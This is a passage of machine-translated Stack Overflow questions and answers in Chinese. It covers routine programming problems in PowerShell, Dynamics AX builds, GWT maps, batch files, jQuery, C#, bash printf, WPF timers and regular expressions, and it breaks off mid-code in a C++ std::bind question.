返回两个数组 $spelbordd[$i+1] 和 $spelbordd[$r] 的数组（切片的串联），实际上数组元素表达式 [$i+1,$r] 解析为 [$i+( 1,$r)] 等尝试通过使用其 op_Addition 方法将 $i 添加到数组 [System.Object[]] (1,$r) （当您将 '+' 运算符与非值类型对象）。由于 [System.Object[]] 没有 op_Addition 方法，因此列出的错误结果。

PS 在这种情况下，意外的优先级问题只是由于语法错误（访问二维数组的方法不正确）而暴露出来的。但是，微妙的运算符优先级可以体现在更常见的表达式中。除了那些使用本身就是表达式的元素创建数组的表达式之外，最可能的陷阱是格式运算符“-f”，它的优先级介于“，”和算术运算符之间。因此，以下示例产生了一些意想不到的结果：

'{0} {1}' -f 1+2, 2
错误，格式化参数不足，
因为它解析为
('{0} {1}' -f 1)+(2,2)
并且在尝试之前格式化失败将“+”应用于 (2,2)。

'{0} {1}' -f 1,2+2
1 22
因为它解析为
('{0} {1}' -f (1,2))+2
和 ('{0} { 1}' -f (1,2)) 是一个 [System.String]，虽然它也没有 op_Addition，但在 Powershell 中使用“+”运算符具有明确定义的行为（[https://msdn.microsoft。 com/en-us/powershell/reference/3.0/microsoft.powershell.core/about/about_arithmetic_operators](https://msdn.microsoft.com/en-us/powershell/reference/3.0/microsoft.powershell.core/about/about_arithmetic_operators)）。

'{0} {0}' -f 1+2,2 #使用第一个格式参数两次
1 12 2
因为它被解析为
('{0} {0}' -f 1)+(2,2)
并且，因为左操作数的类型决定了如何应用运算符，结果是
('{0} {0}' -f 1)+[System.String] (2,2) # [System.String] $somearray is ( $somearray -加入''）

说到-join，优先级是

一元连接
,
二元连接

所以

-join 1,2 是 (-join 1),2 = ('1',2) # ([String],[Int32])
-join (1,2) = '12'
1,2 -join '' 是(1,2) -join '' = '12'

顺便说一句，从技术上讲，OP 使用的是数组数组，而不是二维数组，这就是元素访问语法错误的原因。如果 OP 实际上创建了一个二维数组（如 $spelbordd = new-object 'Boolean[,]' 10,10），那么元素访问语法将是正确的。

# tfs - XPO 导入 - 由于缺少字段，关系不完整

> ID：14348641
> 
> 赞同：3
> 
> 时间：2013-01-15T23:10:22.747
> 
> 标签：tfs, tfsbuild, axapta, dynamics-ax-2012

我已经设置构建有一段时间了。为此，我使用 Microsoft 为 AX 2012 提供的[脚本（Microsoft Dynamics AX 2012 的构建和部署脚本](http://gallery.technet.microsoft.com/scriptcenter/Build-and-deploy-for-b166c6e4)）

在脚本中需要进行一些调整以使 TFS 以应有的方式工作，并且还涉及一些额外的操作，因为我们在 startupPost 中有代码（由于 sysSetupFormRun 类中的修改，使用消息窗口而不是编译器输出表单进行预编译)

但是现在困扰我几个星期的是 XPO 导入。提供的脚本使用最新的[CombineXPO 工具](https://informationsource.dynamics.com//RFPServicesOnline/Rfpservicesonline.aspx?ToolDocName=Microsoft%20Dynamics%20AX%202012%20Combine%20XPO%20Tool%20Beta%201.0%7CQJ4JEM76642V-8-1002)将从 TFS 获取的所有 XPO 文件合并到一个大 XPO 中。完成后，XPO 将导入 Ax。

这里真正的问题是我不信任 XPO 导入，因为我们经常看到大量错误，例如：

**编译器错误：\Data Dictionary\Tables\EPSICParameters\EPSICParameters：由于缺少字段，关系货币不完整**

实际上，Ax 中不存在这些字段，但是当我查看应该导入的 XPO 时，存在关系字段，这表明源是从 TFS 获取的。

```
REFERENCE #Currency
    PROPERTIES
      Name                #Currency
      Table               #Currency
      RelatedTableCardinality   #ZeroOne
      Cardinality         #ZeroMore
      RelationshipType    #Association
      UseDefaultRoleNames #Yes
    ENDPROPERTIES

    FIELDREFERENCES
      REFERENCETYPE PKFK
      PROPERTIES
        Field               #CurrencyCode
        RelatedField        #CurrencyCode
        SourceEDT           #CurrencyCode
      ENDPROPERTIES

    ENDFIELDREFERENCES
  ENDREFERENCE 
```

任何人都可以在这里帮助我吗？这件事确实阻碍了我们使用 Ax 的自动构建，因为我们根本无法判断下一个构建何时可以正常运行：s

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-01-14T23:40:57.643

我也有这个错误。我认为，其根本原因是当您将 EDT 拖放到表上以创建字段时自动创建的关系，然后对该字段的重命名破坏了表关系。但是，EDT 关系仍然可以在现场工作，前端/GUI 不会中断。例如，将 HcmApprover EDT 拖到表上会提示您询问是否要将 EDT 中的 ForeignKey 关系添加到当前表中？如果您说是，然后将字段从 HcmApprover 重命名为其他名称，则表关系将中断。但是，前端似乎可以正常工作（您可能仍然可以看到一个工作下拉菜单，以查看 HCM 模块中的雇佣工人）。

我并不肯定，但我认为 GUI 仍然有效，因为字段本身的 EDT 关系导致前端仍然正常运行。

无论哪种方式，如果您拖放 EDT（这不仅仅适用于 EDT）来创建字段并进行任何重命名，请确保相应的自动/框架生成的“东西”也手动重命名（即由您）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T07:00:25.403

尝试两次导入，忽略第一次运行的任何错误。

# gwt - 如果在 TabPanel 内使用 GWT GoogleMaps v3.8 灰色区域

> ID：14348643
> 
> 赞同：0
> 
> 时间：2013-01-15T23:10:30.137
> 
> 标签：gwt, google-maps-api-3

我在使用 gwt GoogleMaps v3.8 时遇到问题

这段代码按预期工作得很好：

```
public class TestMaps implements EntryPoint {

    public void onModuleLoad() {
        final SimplePanel sp = new SimplePanel();
        sp.setSize("460px", "320px");
        AjaxLoaderOptions options = AjaxLoaderOptions.newInstance();
        options.setOtherParms("sensor=false&language=en");
        Runnable callback = new Runnable() {
            public void run() {
                LatLng myLatLng = LatLng.create(51.5171, 0.1062);
                MapOptions myOptions = MapOptions.create();
                myOptions.setZoom(12.0);
                myOptions.setCenter(myLatLng);
                myOptions.setMapTypeId(MapTypeId.ROADMAP);
                GoogleMap.create(sp.getElement(), myOptions);
            }
        };
        AjaxLoader.loadApi("maps", "3", callback, options);
        RootPanel.get("GoogleMapsContainer").add(sp);
    }
} 
```

如果我将地图放在 TabPanel 中，我会得到灰色区域：

```
public class TestMaps implements EntryPoint {

    private final native static void resizeMap(GoogleMap map) /*-{
        $wnd.google.maps.event.trigger(map, 'resize');
    }-*/;

    public void onModuleLoad() {
        final DecoratedTabPanel dtp = new DecoratedTabPanel();
        final SimplePanel sp = new SimplePanel();
        sp.setSize("460px", "320px");
        AjaxLoaderOptions options = AjaxLoaderOptions.newInstance();
        options.setOtherParms("sensor=false&language=en");
        Runnable callback = new Runnable() {
            public void run() {
                LatLng myLatLng = LatLng.create(51.5171, 0.1062);
                MapOptions myOptions = MapOptions.create();
                myOptions.setZoom(12.0);
                myOptions.setCenter(myLatLng);
                myOptions.setMapTypeId(MapTypeId.ROADMAP);
                GoogleMap map = GoogleMap.create(sp.getElement(), myOptions);
                dtp.add(sp, "Tab1", false);
                resizeMap(map);
                map.setZoom(map.getZoom());

            }
        };
        AjaxLoader.loadApi("maps", "3", callback, options);
        RootPanel.get("GoogleMapsContainer").add(dtp);
    }
} 
```

我看到很少有关于类似问题的帖子，但没有一个建议对我有用。任何意见，建议表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T13:38:46.420

我不熟悉 GWT，但看起来你必须在选择选项卡时触发调整大小事件，而不是在添加它时

# php - 如何在php中将两个无符号的32位整数组合成64位整数？

> ID：14348644
> 
> 赞同：0
> 
> 时间：2013-01-15T23:10:33.420
> 
> 标签：php

我有两个无符号的 32 位整数，我需要将它们组合成一个长整数或一个字符串，只要我有数字，它是否是字符串格式都没有关系。例如：

低：-589298671

高：4

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T00:02:19.060

我最终在[本文](http://www.mysqlperformanceblog.com/2007/03/27/integers-in-php-running-with-scissors-and-portability/)中找到了解决方案。

它完美地解决了我的问题，也适用于任何系统。这是一段很棒的代码。

# c# - 用于反编译代码的 Visual Studio 或 Resharper 扩展

> ID：14348648
> 
> 赞同：23
> 
> 时间：2013-01-15T23:10:59.373
> 
> 标签：c#, .net, visual-studio, resharper

有谁知道 Visual Studio 扩展，它将反编译程序集并允许您在 Visual Studio 中查看给定类的代码，而不必离开 VS 并使用 ILSpy 或其他“外部”反射工具？我知道 Resharper 也有一个反射工具，但如果你能在 VS 中启动它会很好。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2018-05-24T20:18:03.103

较新版本的 Visual Studio 2017 现在包括一个名为[导航到反编译源](https://docs.microsoft.com/en-us/visualstudio/ide/go-to-and-peek-definition#view-decompiled-source-definitions-instead-of-metadata-c)的实验性功能。它要求您显式启用它（并重新启动 Visual Studio），但一旦您这样做，您就可以看到代码引用的程序集的反编译源代码。

例如，如果您将插入符号（文本光标）放在方法调用中的方法名称上并按下`F12`（默认情况下），它将在 IDE 中打开一个新选项卡，其中显示该方法的反编译源代码。微软表示这在幕后使用了 ILSpy，但这更方便，并且不需要你安装任何新东西。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2013-01-16T09:13:28.107

> 我知道 Resharper 也有一个反射工具，但如果你能在 VS 中启动它会很好。

你可以。将光标放在标识符上，选择`ReSharper | Navigate | Navigate To...`（VS 方案中的键盘快捷键是`Alt`+ ```），然后选择`Decompiled Sources`.

这使用与独立工具 dotPeek 相同的反编译引擎。

请注意，在这种反编译的源代码中，您必须继续使用相同的导航方法来跟踪定义，`F12`否则`Ctrl`+click 将返回对象浏览器。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2017-08-31T17:07:11.153

假设在类/方法处于焦点时按 F12 的默认快捷键，您可以将 ReSharper 设置为自动反编译引用。这最终效果很好，就好像外部程序集引用与源解决方案中的任何其他类一样。

[![在此处输入图像描述](../Images/a5e3595a934d7b787658f9c05b750782.png)](https://i.stack.imgur.com/KrY3o.jpg)

专注于按 F12 时被定向到的源示例`new HttpClient()`

[![在此处输入图像描述](../Images/6a79e05b474af70bf0cac97f4da6cebf.png)](https://i.stack.imgur.com/RhAju.jpg)

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-01-15T23:18:44.503

我建议您使用[.NET Reflector](http://www.reflector.net/)，它具有内置的 VS 集成来进行程序集反编译，并且比 Resharper 好得多。请查看[此页面](http://www.reflector.net/category/visual-studio/)以获取更多知识。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2016-08-11T19:57:49.767

[http://ilspy.net/](http://ilspy.net/)是免费和开源的。并有一个 Visual Studio 插件。

# windows - 如何为 Windows XP 和更高版本重新编码 Windows XP %PROGRAMFILES%

> ID：14348649
> 
> 赞同：0
> 
> 时间：2013-01-15T23:11:04.490
> 
> 标签：windows, windows-xp, cmd

我应该如何重新编码包含以下命令的 Windows XP cmd 批处理文件，以便在两个 .exe*可能*位于**Program Files (x86)**中的更高版本的 Windows 上也能正常工作？

```
start "GW" /WAIT "%PROGRAMFILES%\GoldWave\GoldWave.exe" [...arguments...]
start "BC" /WAIT "%PROGRAMFILES%\Beyond Compare 3\BCompare.exe" [...arguments...] 
```

这失败了：

```
PATH=%PATH%;%PROGRAMFILES%;%PROGRAMFILES(X86)%
...
start "GW" /WAIT "GoldWave\GoldWave.exe" [...arguments...]
start "BC" /WAIT "Beyond Compare 3\BCompare.exe" [...arguments...] 
```

这成功但很笨拙：

```
PATH=%PATH%;%PROGRAMFILES%\Goldwave;%PROGRAMFILES(X86)%\Goldwave;%PROGRAMFILES%\Beyond Compare 3;%PROGRAMFILES(X86)%\Beyond Compare 3%
...
start "GW" /WAIT "GoldWave.exe" [...arguments...]
start "BC" /WAIT "BCompare.exe" [...arguments...] 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:48:39.500

您可以先检查是否`%ProgramFiles(x86)%`有值。如果是这样，您正在寻找的程序应该在该目录中找到：

```
SETLOCAL
SET PROGRAMFILESINUSE=%ProgramFiles%
IF NOT "%ProgramFiles(x86)%"=="" SET PROGRAMFILESINUSE=%ProgramFiles(x86)%
START "GW" /WAIT "%PROGRAMFILESINUSE%\GoldWave\GoldWave.exe" 
```

或者，您可以让它更复杂一些，并让它实际检查您要查找的文件存在的位置：

```
SETLOCAL
SET PROGRAMDIRECTORY=
SET RELATIVEFILEPATH=GoldWave\Goldwave.exe
CALL :CHECKFORPROGRAM "%RELATIVEFILEPATH%" "%ProgramFiles(x86)%"
CALL :CHECKFORPROGRAM "%RELATIVEFILEPATH%" "%ProgramFiles%"
IF "%PROGRAMDIRECTORY%"=="" GOTO :NOTFOUND
ECHO Found at %PROGRAMDIRECTORY%\%RELATIVEFILEPATH%
GOTO :EOF
:CHECKFORPROGRAM
IF NOT "%PROGRAMDIRECTORY%"=="" GOTO :EOF
IF EXIST "%~2\%~1" SET PROGRAMDIRECTORY=%~2
GOTO :EOF
:NOTFOUND
ECHO %RELATIVEFILEPATH% not found
GOTO :EOF 
```

# javascript - 为什么用 ?variable=value 链接外部 javascript

> ID：14348651
> 
> 赞同：0
> 
> 时间：2013-01-15T23:11:15.107
> 
> 标签：javascript, html

我见过这样的代码：

```
<script type="text/javascript" src="js/my_js.js?id=<?php echo time(); ?>"></script> 
```

如果可能的话，我不明白 id 的原因，也不明白如何在 .js 文件中使用 id。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:12:32.713

就是强制浏览器刷新JavaScript文件，否则浏览器以后可能会显示缓存的版本。

您也可以对 CSS 文件执行此操作。

# jquery - jquery deferred 在这种情况下如何工作？

> ID：14348653
> 
> 赞同：0
> 
> 时间：2013-01-15T23:11:19.883
> 
> 标签：jquery

使用回调，我有以下代码

```
var TK = {
    List: [],
    getSectionA: function(listName, callback)
    {
        var arrayList = [];
        $.get('ajax/test.html', {sendName: listName}, function(data) {

              $.each(data, function()
              {
                     arrayList = data;
              });
         callback(arrayList);
        });       

    }

}; 
```

调用函数

```
 $("#dropDownList").change(function()
   {
       TK.getSectionA(fileName, function(data)
       {
             TK.List = data;
             alert(TK.List); // This works ok...
       });

             alert(TK.List); // This does not work when calling using this property outside the callback..
   }); 
```

我怎样才能让它在另一个函数中的回调函数之外工作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:24:41.507

jQuery get() 函数返回 promise 接口，允许您添加任意数量的函数来处理 get() 成功完成 (done()) 或失败 (fail) 或只是完成任一方式 (always()) .

promise 接口与 deferred 接口相同，但只有“只读”方法，因此您不能干扰该过程，但您可以看到会发生什么。

如果你返回承诺，它可以用来做任何你想做的事情：

```
 var TK = {
        List: [],
        getSectionA: function(listName, callback)
        {
            var arrayList = [];
            return $.get('ajax/test.html', {sendName: listName}, function(data) {

                  $.each(data, function()
                  {
                         arrayList = data;
                  });
             callback(arrayList);
            });       

        }

}; 
```

像这样称呼它：

```
 TK.getSectionA(fileName, function(data)
       {
             TK.List = data;
             alert(TK.List); // This works ok...
       }).always(function() {
             alert("Get ended: " + TK.List);
       }); 
```

您可以在此页面[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)上阅读它，但必须跳到其中包含“承诺”的段落。

# apache-flex - 在 flex 中流式传输 Web 服务调用

> ID：14348657
> 
> 赞同：0
> 
> 时间：2013-01-15T23:11:30.123
> 
> 标签：apache-flex, soap, actionscript, upload, urlloader

我正在尝试在将信息发送到 .NET wcf SOAP Web 服务的 flex/air 应用程序中创建文件上传。文件上传还必须有进度指示事件。该服务使用 Stream 作为 MessageBodyMember 以允许流式上传。我的输入看起来有点像这样：

```
[MessageContract]
public class SendFileRequestMessage : IDisposable
{
    public string UserName;

    [MessageBodyMember(Order = 1)]
    public Stream FileData;
} 
```

服务看起来像这样：

```
public interface IFileTransferService
{
    [OperationContract]
    SendFileResponseMessage SendFile(SendFileRequestMessage request);
} 
```

现在，当我在 VS2010 中创建代理类时，我得到了 FileData 的 Stream 对象。如果我在 Flash Builder 4.7 中执行相同操作，则 FileData 被解释为 ByteArray。我已经在我的客户端中查看了 FileUpload 和 UrlLoader，但我无法设置正文成员。我的动作脚本现在看起来像这样 *不起作用*

```
var dataToSave:XML = <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:q0="http://mystuff/uploadservice/v1"><soapenv:Body><q0:SendFile/></soapenv:Body></soapenv:Envelope>

            var request:URLRequest = new URLRequest("http://localhost:31454/Uploadhandler.svc");
            request.requestHeaders = new Array(new URLRequestHeader("SOAPAction", "http://mystuff/uploadservice/v1/IFileTransferService/SendFile"));
            request.data = dataToSave;
            request.contentType = "text/xml; charset=utf-8";

            request.method = URLRequestMethod.POST;

            var loader:URLLoader = new URLLoader();
            loader.load(request); 
```

那么如何将流文件从 flex 上传到soap服务呢？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T11:30:37.523

我不熟悉 .NET SOAP 模型，但如果它期望文件数据的标准 http 内容配置，您可以尝试获取文件的 FileReference 对象，然后在其上传方法中传递您的 URLRequiest。在你的情况下，这可能是

```
 ... Create class level variable ...
        var fr:FileReference = new FileReference();

        ... Obtain file reference somewhere ...
        //Set handlers for Filereference events 
        fr.browse(); //Obtain actual file reference  

        ... Somewhere in selectHandler chain....

        var dataToSave:XML = <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:q0="http://mystuff/uploadservice/v1"><soapenv:Body><q0:SendFile/></soapenv:Body></soapenv:Envelope>

        var request:URLRequest = new URLRequest("http://localhost:31454/Uploadhandler.svc");
        request.requestHeaders = new Array(new URLRequestHeader("SOAPAction", "http://mystuff/uploadservice/v1/IFileTransferService/SendFile"));
        request.data = dataToSave;
        request.contentType = "text/xml; charset=utf-8";
        request.method = URLRequestMethod.POST;

        //Do POST
        fr.upload(request); 
```

本[文档](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/FileReference.html#includeExamplesSummary)包含使用 FileReference 的示例。

# c# - 正确地将匿名类型声明为数组以保持范围

> ID：14348658
> 
> 赞同：3
> 
> 时间：2013-01-15T23:11:30.463
> 
> 标签：c#, linq, c#-4.0

我要做的就是`var place`正确声明，所以一旦我进入`foreach`循环它仍然在范围内。我假设我需要在`if`for 语句之前声明它`connections`。这是一个正确的假设吗？如果是，我该如何声明？谢谢！

```
using (var db = new DataClasses1DataContext())
        {
            if (connections == "Connections")
            {
                var place = (from v in db.pdx_aparts
                             where v.Latitude != null && v.Region == region && v.WD_Connect >= 1
                             select new
                             {
                                 locName = v.Apartment_complex.Trim().Replace(@"""", ""),
                                 latitude = v.Latitude,
                                 longitude = v.Longitude
                             }).Distinct().ToArray();
            }
            else
            {
                var place = (from v in db.pdx_aparts
                             where v.Latitude != null && v.Region == region &&    ((v.WD_Connect == null) || (v.WD_Connect == 0))
                             select new
                             {
                                 locName = v.Apartment_complex.Trim().Replace(@"""", ""),
                                 latitude = v.Latitude,
                                 longitude = v.Longitude
                             }).Distinct().ToArray();

            }

            foreach (var result in place)
            .... 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T23:20:35.350

您可以创建一个包含单个条目的数组，该条目的值稍后会被忽略：

```
// Note: names *and types* must match the ones you use later on.
var place = new[] { new { locName = "", latitude = 0.0, longitude = 0.0 } };
if (connections = "Connections")
{
    // Note: not a variable declaration
    place = ...;
}
else
{
    place = ...;
} 
```

这是有效的，因为每次使用具有相同名称和类型的属性的匿名类型，以相同的顺序，都将使用相同的具体类型。

我认为最好让代码*只*在它需要的部分有所不同：

```
var query = v.db.pdx_aparts.Where(v => v.Latitude != null && v.Region == region);
query = connections == "Connections"
    ? query.Where(v => v.WD_Connect >= 1)
    : query.Where(v => v.WD_Connect == null || v.WD_Connect == 0);
var places = query.Select(v =>  new
                          {
                              locName = v.Apartment_complex
                                         .Trim()
                                         .Replace("\"", ""),
                              latitude = v.Latitude,
                              longitude = v.Longitude
                          })
                  .Distinct()
                  .ToArray(); 
```

在这里更容易看出*唯一*取决于`connections`值的部分是查询中处理`WD_Connect`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:18:20.637

您可以将 转换`if`为`?:`.

```
var place = connections == "Connections" ? monsterQuery1 : monsterQuery2; 
```

我认为这不是一个好的解决方案，因为您的查询太大（不可读）。

**如果您引入一个您使用的命名类**而不是匿名类型，那会好得多。R# 在“灯泡菜单”重构中为您做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T23:23:56.677

您可以只使用 1 查询，因为它们几乎相同，只需在 where 子句中添加额外的条件

```
var place = (from v in db.pdx_aparts
             where v.Latitude != null && v.Region == region 
             &&  connections == "Connections" 
             ? v.WD_Connect >= 1 
             : ((v.WD_Connect == null) || (v.WD_Connect == 0))
             select new
             {
                 locName = v.Apartment_complex.Trim().Replace(@"""", ""),
                 latitude = v.Latitude,
                 longitude = v.Longitude
             }).Distinct().ToArray();

 foreach (var result in place)
 .... 
```

# bash - printf %d 是添加而不是替换填充的零

> ID：14348659
> 
> 赞同：0
> 
> 时间：2013-01-15T23:11:31.810
> 
> 标签：bash, ubuntu, printf, padding, zero

长话短说： printf 正在向数字添加零，而不是让数字替换它们。

更多细节：

我目前正在尝试在我的 Ubuntu 操作系统上使用 Bash 来执行一系列包含对我的数据库查询的分解文件。

这些文件被分解为如下所示：

```
x0000000000
x0000000001
x0000000002
etc. 
```

我正在制作一个小脚本，通过使用 Bash 的 printf 的填充零函数来运行这些文件。

我的脚本看起来和我在 Google 上搜索过和看到的所有脚本一样，但结果却不同。

这是我的脚本：（不是用于查询的脚本，而是用于获取文件名的脚本）

```
for i in {0..10};
do
printf "x%010d"$i;
done 
```

应该是这样的：

```
x0000000000
x0000000001
x0000000002
x0000000003
x0000000004
x0000000005
x0000000006
x0000000007
x0000000008
x0000000009
x0000000010 
```

而是像这样出来：

```
x00000000000
x00000000001
x00000000002
x00000000003
x00000000004
x00000000005
x00000000006
x00000000007
x00000000008
x00000000009
x000000000010 
```

它纯粹是向数字添加零，而不是替换它们的数字。

如果我无意中打开了某些设置、做错了什么或有错误，有人可以告诉我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:14:54.327

您需要一个空格，否则会发生串联：

```
printf "x%010d" $i;
               ^ 
```

# c# - 当 ItemsSource 更改时更新 Datagrid

> ID：14348660
> 
> 赞同：2
> 
> 时间：2013-01-15T23:11:33.630
> 
> 标签：c#, wpf, timer, wpfdatagrid

我已经通过许多论坛为我的问题找到解决方案，但我没有找到合适的解决方案。

我有一个遵循 MVVM 模式`Datagrid`的绑定到（MS SQL Server 2008）。`Datasource`我已经绑定`ItemsSource`到一个`ObservableCollection`并实现了`INotifyPropertyChanged`接口。

我的数据库在特定时间限制内更改表值。现在，我想`Datasource`在我的 UI 中反映这种变化（即我希望看到我的 UI`ItemsSource`得到更新）。当我想到这一点时，我明白我应该实现一个`Timer`概念（如轮询），以便我的查询每 15 秒循环运行一次。

这是我的`ViewModel Class`，请指导我应该在哪里实施`Timer Class`？

```
namespace MVVM_DemoAppl.ViewModels
{
public class MainViewModel : INotifyPropertyChanged
{
 // Properties for the DispatcherTimer
  private bool disposed;
  private DispatcherTimer timer = new DispatcherTimer();
  // declaring instance of a class and Observable collection
  Model _myModel = new Model();
  private ObservableCollection<SystemStatus> _systemStatusData= new ObservableCollection<SystemStatus>();
  public ObservableCollection<SystemStatus> SystemStatusData
  {
    get { return _systemStatusData; }
    set
      {
        _systemStatusData= value;
      OnPropertyChanged("SystemStatusData");
      }
  }

public MainViewModel()
 {
   initializeload();
   timer.Tick += new EventHandler(timer_Tick);
   timer.Interval = new TimeSpan(0, 0, 15);
   timer.Start();
 }

 ~MainViewModel()
   {
       Dispose(false);
   }

  protected virtual void Dispose(bool disposing)
   {
       if (!disposed)
       {
           if (disposing)
           {
               timer.Stop();
               timer.Tick -= new EventHandler(timer_Tick);
           }
           disposed = true;
       }
   }

   private void timer_Tick(object sender, EventArgs e)
   {
       try
       {
           EventLogData.Clear();
           initializeload();
       }
       catch (Exception ex)
       {
           timer.Stop();
           Console.WriteLine(ex.Message);

       }
   }
private void initializeload()
{
   DataTable table = _myModel.getData();

 for (int i = 0; i < table.Rows.Count; ++i)
   SystemStatusData.Add(new SystemStatus
   {
Systems= table.Rows[i][0].ToString(),
Date =Convert.ToDateTime(table.Rows[i][1]),
Types = table.Rows[i][2].ToString(),
Messages = table.Rows[i][3].ToString(),
Critical = Convert.ToBoolean(table.Rows[i][1]),
    });
}

  public event PropertyChangedEventHandler PropertyChanged;

 private void OnPropertyChanged(string propertyname)
   {
     var handler = PropertyChanged;
     if (handler != null)
     handler(this, new PropertyChangedEventArgs(propertyname));
  }
 }

public class Model
 {
  string con = ConfigurationManager.AppSettings["ConnectionStrings"];
   public DataTable getData()
{
  DataTable ndt = new DataTable();
  SqlConnection sqlcon = new SqlConnection(con);
  sqlcon.Open();
  SqlDataAdapter da = new SqlDataAdapter("select top 5 System,Date,Typ,Message,Critical     from test_DB.dbo.SystemStatus",con);
  da.Fill(ndt);
  return ndt;
  }
 }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T23:51:33.720

您可以使用 DispatcherTimer。使您的 ViewModel 一次性并在处置时终止计时器。在构造函数中，配置计时器，将处理程序挂钩到 Tick 事件，然后启动它：

```
public MainViewModel()
{
    initializeload();
    timer.Tick += new EventHandler(timer_Tick);
    timer.Interval = new TimeSpan(0, 0, 15);
    timer.Start();
}
~MainViewModel()
{
    Dispose(false);
}
public void Dispose()
{
    Dispose(true);
    GC.SuppressFinalize(this);
}
protected virtual void Dispose(bool disposing)
{
    if (!disposed)
    {
        if (disposing)
        {
            timer.Stop();
            timer.Tick -= new EventHandler(timer_Tick);
        }
        disposed = true;
    }
}

private void timer_Tick(object sender, EventArgs e)
{
    try 
    {
        SystemStatusData.Clear();
        initializeload();
    } 
    catch (...) 
    {
        // Problem best to stop the timer if there is an error...
        timer.Stop();
    }
}

private bool disposed;
private DispatcherTimer timer = new DispatcherTimer(); 
```

# php - 字符未正确保存在数据库中

> ID：14348669
> 
> 赞同：0
> 
> 时间：2013-01-15T23:12:33.153
> 
> 标签：php, jquery, mysql, ajax

我不确定这是因为 jquery、mysql 还是 php

我有一个基本的 AJAX 调用：

```
$(document).on("click", "#save-edit", function(){
    var id = $(this).closest("div.answer-section").attr("data-id");
    $.ajax({
        type: "post",
        data: {
            id: id,
            answer: $("#edit-box").val()
        },
        url: "/process/edit",
        dataType: "json",
        success: function(data){
            // display the data
        }
    });
}); 
```

和一个基本的 SQL 查询：

```
$sql = $pdo->prepare("update answers set answer = :answer where answer_id = :aid");
$sql->bindParam("answer", $_POST["answer"], PDO::PARAM_STR);
$sql->bindParam("aid", $_POST["id"], PDO::PARAM_INT);
$sql->execute(); 
```

我遇到的问题是，它保存这样的字符：`é é`在数据库中，`Ã© Ã©`然后显示`Ã© Ã©`在页面上，那么是什么导致了这个，JQuery，MySQL 或 PHP？我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:23:00.010

好吧，我找到了答案，一切都很好，只需将其添加到 HTML 标题中：

```
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
```

# asp.net - 用于网站或网页的 Testdriven.NET

> ID：14348670
> 
> 赞同：0
> 
> 时间：2013-01-15T23:12:35.640
> 
> 标签：asp.net

我是单元测试的新手，但我正在尝试 TestDriven.Net，我正在阅读和尝试测试函数或类方法的示例。

是否有任何信息如何使用它来测试 ASP.NET 中的网站或网页？我对此一无所知。谢谢

# javascript - javascript regex - 仅在 (.)+ 组中生成最后一个字母？

> ID：14348674
> 
> 赞同：1
> 
> 时间：2013-01-15T23:12:45.930
> 
> 标签：javascript, regex

我正在尝试通过正则表达式拆分字符串并得到意外结果：

```
var str = 'name == abcd';
var pattern = /([^!=>< ]+)\s*([!=><]+)\s*(.)+/i;

pattern.exec(str); 
```

该示例的结果是：`[ "name == abcd", "name", "==", **"d"** ]`

为什么**`"d"`**而不是**`"abcd"`**？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T23:18:23.757

捕获组`(.)`只捕获一个字符。该构造`(.)+`表示“一个或多个捕获组，每个包含一个字符”。它只返回“d”，因为这是遇到的捕获组的最后一次迭代。

如果您在捕获组内移动重复`(.+)`，则您将要求“包含一个或多个字符的捕获组”。这可能就是你想要的。

```
var pattern = /([^!=>< ]+)\s*([!=><]+)\s*(.+)/i; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T23:15:09.117

将最后一个`+`移到括号中：

```
var pattern = /([^!=>< ]+)\s*([!=><]+)\s*(.+)/i; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T23:16:35.463

因为最后一对括号仅捕获最后一个匹配项。将 + 移到括号中： `/([^!=>< ]+)\s*([!=><]+)\s*(.+)/i;`

# c++ - 如何避免使用 std::bind() 临时对象进行显式强制转换？

> ID：14348681
> 
> 赞同：1
> 
> 时间：2013-01-15T23:13:30.723
> 
> 标签：c++, stl, c++11, std-function, stdbind

std::bind 的返回类型（有意）未指定。它可以*存储*在 std::function 中。

下面的示例程序显示了我必须如何将 std::bind() 返回的临时对象显式转换为 std::function 才能调用 fn1()。

如果 std::bind 的返回类型是已知的，我可以重载 Callback 构造函数，并且不再需要显式转换 std::bind 临时对象。

有什么办法可以避免显式演员表？

```
// g++ -std=c++11 test.cxx
#include <functional>

using std::placeholders::_1;

class A
{
    public:
        void funcA (int x) { }
};

class Callback
{
    public:
        Callback () = default;
        Callback (std::function<void(int)> f) { }
        // Wish we knew the return type of std::bind()
        // Callback (return_type_of_std_bind f) { }
};

void fn0 (std::function<void(int)> f) { }
void fn1 (Callback cb) { }

int main (void)
{
